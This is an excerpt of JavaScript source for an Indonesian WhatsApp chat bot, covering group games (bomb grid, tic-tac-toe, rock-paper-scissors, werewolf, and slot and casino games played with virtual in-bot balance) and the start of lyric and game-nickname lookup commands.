			case 'tebakbom':
			case 'petakbom': {
				if (petakbom[m.sender]) return m.reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);

				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				petakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0]),
					board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"],
					bomb: 3,
					lolos: 6,
					pick: 0,
					hadiah: randomNomor(5000, 10000),
					nyawa: ["❤️", "❤️", "❤️"],
					chat: await m.reply(`*PETAK BOM*

1️⃣2️⃣3️⃣
4️⃣5️⃣6️⃣
7️⃣8️⃣9️⃣

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : 3
Nyawa : ❤️❤️❤️`)
				}
			}
			break
			case 'deltebakbom':
			case 'delpetakbom': {
				if (!(petakbom[m.sender])) return m.sendForward(`kamu sedang tidak bermain petakbom!`)
				delete petakbom[m.sender];
				m.reply(`Petakbom di akhiri, hadiah Rp. 0`)
			}
			break
			case 'ttc':
			case 'ttt':
			case 'tictactoe': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				let TicTacToe = require("./lib/tictactoe")
				this.game = this.game ? this.game : {}
				if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.warning('Kamu masih didalam game')
				let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					m.reply('Partner ditemukan!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {
							X: '❌',
							O: '⭕',
							1: '1️⃣',
							2: '2️⃣',
							3: '3️⃣',
							4: '4️⃣',
							5: '5️⃣',
							6: '6️⃣',
							7: '7️⃣',
							8: '8️⃣',
							9: '9️⃣',
						} [v]
					})
					let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
					if (room.x !== room.o) await vreden.sendText(room.x, str, m, {
						mentions: parseMention(str)
					})
					await vreden.sendText(room.o, str, m, {
						mentions: parseMention(str)
					})
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING'
					}
					if (text) room.name = text
					m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${prefix+command} ${text}` : ''))
					this.game[room.id] = room
				}
			}
			break
			case 'delttc':
			case 'delttt': {
				let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
				if (!roomnya) return m.warning(`Kamu sedang tidak berada di room tictactoe !`)
				delete this.game[roomnya.id]
				m.reply(`Berhasil delete session room tictactoe !`)
			}
			break
			case 'suitpvp':
			case 'suit': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (m.mentionedJid[0] === m.sender) return m.warning(`Tidak bisa bermain dengan diri sendiri !`)
				if (!m.mentionedJid[0]) return m.warning(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @0`, m.chat, {
					mentions: '0@s.whatsapp.net'
				})
				this.suit = this.suit ? this.suit : {}
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
				if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.warning(`Orang yang kamu tantang sedang bermain suit bersama orang lain`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
				this.suit[id] = {
					chat: await m.reply(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (this.suit[id]) m.reply(`_Waktu suit habis_`)
						delete this.suit[id]
					}, 60000),
					poin,
					poin_lose,
					timeout
				}
			}
			break
			case 'wwpc':
			case 'ww':
			case 'werewolf': {
				let jimp = require("jimp")
				const resize = async (image, width, height) => {
					const read = await jimp.read(image);
					const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
					return data;
				};

				let {
					emoji_role,
					sesi,
					playerOnGame,
					playerOnRoom,
					playerExit,
					dataPlayer,
					dataPlayerById,
					getPlayerById,
					getPlayerById2,
					killWerewolf,
					killww,
					dreamySeer,
					sorcerer,
					protectGuardian,
					roleShuffle,
					roleChanger,
					roleAmount,
					roleGenerator,
					addTimer,
					startGame,
					playerHidup,
					playerMati,
					vote,
					voteResult,
					clearAllVote,
					getWinner,
					win,
					pagi,
					malam,
					skill,
					voteStart,
					voteDone,
					voting,
					run,
					run_vote,
					run_malam,
					runprefixagi
				} = require('./lib/werewolf.js')

				// [ Thumbnail ] 
				let thumb = "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

				const {
					sender,
					chat
				} = m;
				vreden.werewolf = vreden.werewolf ? vreden.werewolf : {};
				const ww = vreden.werewolf ? vreden.werewolf : {};
				const data = ww[chat];
				const value = args[0];
				const target = args[1];
				let byId = getPlayerById2(sender, parseInt(target), ww);
				// [ Membuat Room ]
				if (value === "create") {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (chat in ww) return reply("Group masih dalam sesi permainan");
					if (playerOnGame(sender, ww) === true)
						return reply("Kamu masih dalam sesi game");
					ww[chat] = {
						room: chat,
						owner: sender,
						status: false,
						iswin: null,
						cooldown: null,
						day: 0,
						time: "malem",
						player: [],
						dead: [],
						voting: false,
						seer: false,
						guardian: [],
					};
					await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

					// [ Join sesi permainan ]
				} else if (value === "join") {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!ww[chat]) return reply("Belum ada sesi permainan");
					if (ww[chat].status === true)
						return reply("Sesi permainan sudah dimulai");
					if (ww[chat].player.length > 16)
						return reply("Maaf jumlah player telah penuh");
					if (playerOnRoom(sender, chat, ww) === true)
						return reply("Kamu sudah join dalam room ini");
					if (playerOnGame(sender, ww) === true)
						return reply("Kamu masih dalam sesi game");
					let data = {
						id: sender,
						number: ww[chat].player.length + 1,
						sesi: chat,
						status: false,
						role: false,
						effect: [],
						vote: 0,
						isdead: false,
						isvote: false,
					};
					ww[chat].player.push(data);
					let player = [];
					let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
					for (let i = 0; i < ww[chat].player.length; i++) {
						text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
						player.push(ww[chat].player[i].id);
					}
					text += "\nJumlah player minimal adalah 5 dan maximal 15";
					vreden.sendMessage(
						m.chat, {
							text: text.trim(),
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
									mediaUrl: thumb,
								},
								mentionedJid: player,
							},
						}, {
							quoted: m
						}
					);

					// [ Game Play ]
				} else if (value === "start") {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!ww[chat]) return reply("Belum ada sesi permainan");
					if (ww[chat].player.length === 0)
						return reply("Room belum memiliki player");
					if (ww[chat].player.length < 5)
						return reply("Maaf jumlah player belum memenuhi syarat");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("Kamu belum join dalam room ini");
					if (ww[chat].cooldown > 0) {
						if (ww[chat].time === "voting") {
							clearAllVote(chat, ww);
							addTimer(chat, ww);
							return await run_vote(vreden.chat, ww);
						} else if (ww[chat].time === "malem") {
							clearAllVote(chat, ww);
							addTimer(chat, ww);
							return await run_malam(vreden.chat, ww);
						} else if (ww[chat].time === "pagi") {
							clearAllVote(chat, ww);
							addTimer(chat, ww);
							return await runprefixagi(vreden.chat, ww);
						}
					}
					if (ww[chat].status === true)
						return reply("Sesi permainan telah dimulai");
					if (ww[chat].owner !== sender)
						return reply(
							`Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
						);
					let list1 = "";
					let list2 = "";
					let player = [];
					roleGenerator(chat, ww);
					addTimer(chat, ww);
					startGame(chat, ww);
					for (let i = 0; i < ww[chat].player.length; i++) {
						list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
						player.push(ww[chat].player[i].id);
					}
					for (let i = 0; i < ww[chat].player.length; i++) {
						list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].role === "werewolf" || ww[chat].player[i].role === "sorcerer" ? `[${ww[chat].player[i].role}]` : ""}\n`;
						player.push(ww[chat].player[i].id);
					}
					for (let i = 0; i < ww[chat].player.length; i++) {
						// [ Werewolf ]
						if (ww[chat].player[i].role === "werewolf") {
							if (ww[chat].player[i].isdead != true) {
								var textt = `Hai ${vreden.getName(ww[chat].player[i].id)}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role("werewolf")} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
								await vreden.sendMessage(ww[chat].player[i].id, {
									text: textt,
									mentions: player,
								});
							}
							// [ villager ]
						} else if (ww[chat].player[i].role === "warga") {
							if (ww[chat].player[i].isdead != true) {
								let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${vreden.getName(ww[chat].player[i].id)} Peran kamu adalah *Warga Desa* ${emoji_role("warga")}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
								await vreden.sendMessage(ww[chat].player[i].id, {
									text: texttt,
									mentions: player,
								});
							}

							// [ Penerawangan ]
						} else if (ww[chat].player[i].role === "seer") {
							if (ww[chat].player[i].isdead != true) {
								let texxt = `Hai ${vreden.getName(ww[chat].player[i].id)} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role("seer")}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

								await vreden.sendMessage(ww[chat].player[i].id, {
									text: texxt,
									mentions: player,
								});
							}

							// [ Guardian ]
						} else if (ww[chat].player[i].role === "guardian") {
							if (ww[chat].player[i].isdead != true) {
								let teext = `Hai ${vreden.getName(ww[chat].player[i].id)} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role("guardian")}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;

								await vreden.sendMessage(ww[chat].player[i].id, {
									text: teext,
									mentions: player,
								});
							}

							// [ Sorcerer ]
						} else if (ww[chat].player[i].role === "sorcerer") {
							if (ww[chat].player[i].isdead != true) {
								let textu = `Hai ${vreden.getName(ww[chat].player[i].id)} Kamu terpilih sebagai Penyihir ${emoji_role("sorcerer")}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

								await vreden.sendMessage(ww[chat].player[i].id, {
									text: textu,
									mentions: player,
								});
							}
						}
					}
					await vreden.sendMessage(m.chat, {
						text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
						contextInfo: {
							externalAdReply: {
								title: "W E R E W O L F",
								mediaType: 1,
								renderLargerThumbnail: true,
								thumbnail: await resize(thumb, 300, 175),
								sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
								mediaUrl: thumb,
							},
							mentionedJid: player,
						},
					});
					await run(vreden.chat, ww);
				} else if (value === "kill") {
					if (dataPlayer(sender, ww).role !== "werewolf")
						return m.reply("Peran ini bukan untuk kamu");
					if (byId.db.role === "sorcerer")
						return m.reply("Tidak bisa menggunakan skill untuk teman");
					if (playerOnGame(sender, ww) === false)
						return reply("Kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("Kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("Gunakan hanya nomor")
					let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("Player sudah mati")
					if (byId.db.id === sender)
						return reply("Tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("Player tidak terdaftar")
					reply("Berhasil membunuh player " + parseInt(target))
						.then(() => {
							dataPlayer(sender, ww).status = true;
							killWerewolf(sender, parseInt(target), ww);
						});
				} else if (value === "dreamy") {
					if (dataPlayer(sender, ww).role !== "seer")
						return m.reply("Peran ini bukan untuk kamu");
					if (playerOnGame(sender, ww) === false)
						return reply("Kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("Kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("Gunakan hanya nomor")
					let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("Player sudah mati")
					if (byId.db.id === sender)
						return reply("Tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("Player tidak terdaftar")
					let dreamy = dreamySeer(m.sender, parseInt(target), ww);
					reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
						.then(() => {
							dataPlayer(sender, ww).status = true;
						});
				} else if (value === "deff") {
					if (dataPlayer(sender, ww).role !== "guardian")
						return m.reply("Peran ini bukan untuk kamu");
					if (playerOnGame(sender, ww) === false)
						return reply("Kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("Kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("Gunakan hanya nomor")
					let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("Player sudah mati")
					if (byId.db.id === sender)
						return reply("Tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("Player tidak terdaftar")
					reply(`Berhasil melindungi player ${target}`).then(() => {
						protectGuardian(m.sender, parseInt(target), ww);
						dataPlayer(sender, ww).status = true;
					});
				} else if (value === "sorcerer") {
					if (dataPlayer(sender, ww).role !== "sorcerer")
						return m.reply("Peran ini bukan untuk kamu");
					if (playerOnGame(sender, ww) === false)
						return reply("Kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("Kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("Gunakan hanya nomor")
					let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("Player sudah mati")
					if (byId.db.id === sender)
						return reply("Tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("Player tidak terdaftar")
					let sorker = sorcerer(sesi(m.sender), target);
					reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
						.then(() => {
							dataPlayer(sender, ww).status = true;
						});
				} else if (value === "vote") {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!ww[chat]) return reply("Belum ada sesi permainan");
					if (ww[chat].status === false)
						return reply("Sesi permainan belum dimulai");
					if (ww[chat].time !== "voting")
						return reply("Sesi voting belum dimulai");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("Kamu bukan player");
					if (dataPlayer(sender, ww).isdead === true)
						return reply("Kamu sudah mati");
					if (!target || target.length < 1)
						return reply("Masukan nomor player");
					if (isNaN(target)) return reply("Gunakan hanya nomor");
					if (dataPlayer(sender, ww).isvote === true)
						return reply("Kamu sudah melakukan voting");
					b = getPlayerById(chat, sender, parseInt(target), ww);
					if (b.db.isdead === true)
						return reply(`Player ${target} sudah mati.`);
					if (ww[chat].player.length < parseInt(target))
						return reply("Invalid");
					if (getPlayerById(chat, sender, parseInt(target), ww) === false)
						return reply("Player tidak terdaftar!");
					vote(chat, parseInt(target), sender, ww);
					return reply("✅ Vote");
				} else if (value == "exit") {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!ww[chat]) return reply("Tidak ada sesi permainan");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("Kamu tidak dalam sesi permainan");
					if (ww[chat].status === true)
						return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
					let exitww = `${sender.split("@")[0]} Keluar dari permainan`
					vreden.sendMessage(
						m.chat, {
							text: exitww,
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
									mediaUrl: thumb,
								},
								mentionedJid: sender,
							},
						}, {
							quoted: m
						}
					);
					playerExit(chat, sender, ww);
				} else if (value === "delete") {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!ww[chat]) return reply("Tidak ada sesi permainan");
					if (ww[chat].owner !== sender)
						return reply(`Hanya @${ww[chat].owner.split("@")[0]} yang dapat menghapus sesi permainan ini`);
					reply("Sesi permainan berhasil dihapus").then(() => {
						delete ww[chat];
					});
				} else if (value === "player") {
					if (!ww[chat]) return reply("Tidak ada sesi permainan");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("Kamu tidak dalam sesi permainan");
					if (ww[chat].player.length === 0)
						return reply("Sesi permainan belum memiliki player");
					let player = [];
					let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
					for (let i = 0; i < ww[chat].player.length; i++) {
						text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].isdead === true ? `☠️ ${ww[chat].player[i].role}` : ""}\n`;
						player.push(ww[chat].player[i].id);
					}
					vreden.sendMessage(
						m.chat, {
							text: text,
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
									mediaUrl: thumb,
								},
								mentionedJid: player,
							},
						}, {
							quoted: m
						}
					);
				} else {
					let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
					text += ` • ww create\n`;
					text += ` • ww join\n`;
					text += ` • ww start\n`;
					text += ` • ww exit\n`;
					text += ` • ww delete\n`;
					text += ` • ww player\n`;
					text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
					vreden.sendMessage(
						m.chat, {
							text: text.trim(),
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: `${global.saluran}`,
									mediaUrl: thumb,
								},
							},
						}, {
							quoted: m
						}
					);
				}
			}
			break
			case 'slot': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (usersdb[m.sender].saldo < 2000) return m.warning(`*Balance Kamu Tidak Cukup Untuk Deposit Slot Sebanyak Rp 2000*`)
				usersdb[m.sender].saldo -= 2000
				try {
					let spin1 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin2 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin3 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin4 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin5 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin6 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin7 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin8 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let spin9 = await pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])
					let WinOrLose
					if (spin1 == "🍊" && spin2 == "🍊" && spin3 == "🍊" && spin4 == "🍊" && spin5 == "🍊" && spin6 == "🍊" && spin7 == "🍊" && spin8 == "🍊" && spin9 == "🍊" || spin1 == "🍇" && spin2 == "🍇" && spin3 == "🍇" && spin4 == "🍇" && spin5 == "🍇" && spin6 == "🍇" && spin7 == "🍇" && spin8 == "🍇" && spin9 == "🍇" || spin1 == "🍉" && spin2 == "🍉" && spin3 == "🍉" && spin4 == "🍉" && spin5 == "🍉" && spin6 == "🍉" && spin7 == "🍉" && spin8 == "🍉" && spin9 == "🍉" || spin1 == "🍌" && spin2 == "🍌" && spin3 == "🍌" && spin4 == "🍌" && spin5 == "🍌" && spin6 == "🍌" && spin7 == "🍌" && spin8 == "🍌" && spin9 == "🍌" || spin1 == "🍍" && spin2 == "🍍" && spin3 == "🍍" && spin4 == "🍍" && spin5 == "🍍" && spin6 == "🍍" && spin7 == "🍍" && spin8 == "🍍" && spin9 == "🍍") {
						usersdb[m.sender].rank += 300
						usersdb[m.sender].saldo += 15000
						WinOrLose = "_*Kamu menang lagi*_\n_*dan mendapatkan*_\n_*Mega Jackpot!*_\n+ 300 Points Rank\n+ Rp 15.000 Saldo"
					} else if (spin7 == "🍊" && spin8 == "🍊" && spin9 == "🍊" || spin7 == "🍇" && spin8 == "🍇" && spin9 == "🍇" || spin7 == "🍉" && spin8 == "🍉" && spin9 == "🍉" || spin7 == "🍌" && spin8 == "🍌" && spin9 == "🍌" || spin7 == "🍍" && spin8 == "🍍" && spin9 == "🍍") {
						usersdb[m.sender].rank += 200
						usersdb[m.sender].saldo += 7000
						WinOrLose = "_*Kamu menang dan*_\n_*mendapatkan Jackpot!*_\n+ 200 Points Rank\n+ Rp 7.000 Saldo"
					} else if (spin4 == "🍊" && spin5 == "🍊" && spin6 == "🍊" || spin4 == "🍇" && spin5 == "🍇" && spin6 == "🍇" || spin4 == "🍉" && spin5 == "🍉" && spin6 == "🍉" || spin4 == "🍌" && spin5 == "🍌" && spin6 == "🍌" || spin4 == "🍍" && spin5 == "🍍" && spin6 == "🍍") {
						usersdb[m.sender].rank += 200
						usersdb[m.sender].saldo += 7000
						WinOrLose = "_*Kamu jackpot*_\n+ 200 Points Rank\n+ Rp 7.000 Saldo"
					} else if (spin1 == "🍊" && spin2 == "🍊" && spin3 == "🍊" || spin1 == "🍇" && spin2 == "🍇" && spin3 == "🍇" || spin1 == "🍉" && spin2 == "🍉" && spin3 == "🍉" || spin1 == "🍌" && spin2 == "🍌" && spin3 == "🍌" || spin1 == "🍍" && spin2 == "🍍" && spin3 == "🍍") {
						usersdb[m.sender].rank += 150
						usersdb[m.sender].saldo += 4000
						WinOrLose = "_*Kamu menang dalam*_\n_*Pertandingan ini!*_\n+ 150 Points Rank\n+ Rp 4.000 Saldo"
					} else {
						WinOrLose = "_*Kamu Kalah!*_"
					}
					var contentText = `*── 「 SLOT 」 ──*

${spin1} ${spin2} ${spin3}
${spin4} ${spin5} ${spin6}
${spin7} ${spin8} ${spin9}

${WinOrLose}`
					m.sendForward(contentText)
				} catch (e) {
					m.reply(mess.error.api)
				}
			}
			break
			case 'casino': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!text) return m.warning(`Kirim perintah *${prefix+command}* @tag nominal`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (fs.existsSync(`./database/${m.chat}.json`)) return m.warning(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
				if (!args[1]) return m.warning('Masukan Nominal Nya')
				if (args[1].includes('-')) return m.warning(`Jangan menggunakan -`)
				if (isNaN(parseInt(args[1]))) return m.warning('Nominal Harus Berupa Angka!')
				var anu = usersdb[m.sender].saldo
				var ani = usersdb[users].saldo
				if (anu < args[1] || anu == 'undefined') return m.warning(`Saldo Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}saldo, untuk mengecek Saldo mu!`)
				if (ani < args[1] || ani == 'undefined') return m.warning(`Saldo Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}saldo @tag untuk mengecek Saldo lawanmu`)
				var casinoo = setCasino(`${m.chat}`)
				casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
				casinoo.Y = users
				casinoo.nominal = parseInt(args[1])
				fs.writeFileSync(`./database/casino/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				var starGame = `*🎰 Game Casino 💰*\n\n• @${m.sender.replace("@s.whatsapp.net", "")}\n*Menantang ⚔️*\n• ${args[0]}\n\nDengan Nominal: *Rp ${parseInt(args[1])}*\n${args[0]}\n_Silahkan Pilih Opsi_`
				let button = [{
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"Yes\",\"id\":\"Y\"}`
				}, {
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"No\",\"id\":\"N\"}`
				}]
				vreden.sendButtonText(m.chat, button, starGame, footer, m)
			}
			break
			case 'delcasino':
				if (fs.existsSync('./database/casino/' + m.chat + '.json')) {
					var csn = JSON.parse(fs.readFileSync('./database/casino/' + m.chat + '.json'))
					if (csn.Z.includes(m.sender)) {
						deleteCasino(m.chat)
						m.reply('Berhasil Menghapus Sesi Casino')
					} else if (csn.Y.includes(m.sender)) {
						deleteCasino(m.chat)
						m.reply('Berhasil Menghapus Sesi Casino')
					} else if (isAdmins) {
						deleteCasino(m.chat)
						m.reply('Berhasil Menghapus Sesi Casino')
					} else if (isCreator) {
						deleteCasino(m.chat)
						m.reply('Berhasil Menghapus Sesi Casino')
					} else {
						m.reply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
					}
				} else {
					m.reply('Tidak ada sesi yang berlangsung')
				}
				break
				// Search Menu
			case 'lirik':
			case 'liriklagu': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *judul*\n\n_Contoh_\n\n${prefix+command} Bila Nanti`)
				try {
					let result = await fetchJson(`https://api.vreden.my.id/api/lirik?lagu=${text}`)
					let anu = result.result
					if (anu.error) {
						m.reply("Tidak ada lagu tersebut di Genius")
					} else {
						vreden.sendMessage(m.chat, {
							image: {
								url: anu.image
							},
							caption: `*${pj}乂 LIRIK - LAGU${pj}*\n\n*Judul :* ${anu.title}\n*Artis :* ${anu.artist}\n*Lirik :* ${anu.lyrics}\n\n`
						}, {
							quoted: m
						})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ffstalk': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} id`)
				if (isNaN(text)) return m.warning(`ID harus berupa angka!`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let epep = await ffstalk(text)
					if (epep === null) return m.reply('Username Tidak Ditemukan.')
					m.reply(`Id : ${text}
Nickname : ${epep}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'mlstalk': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
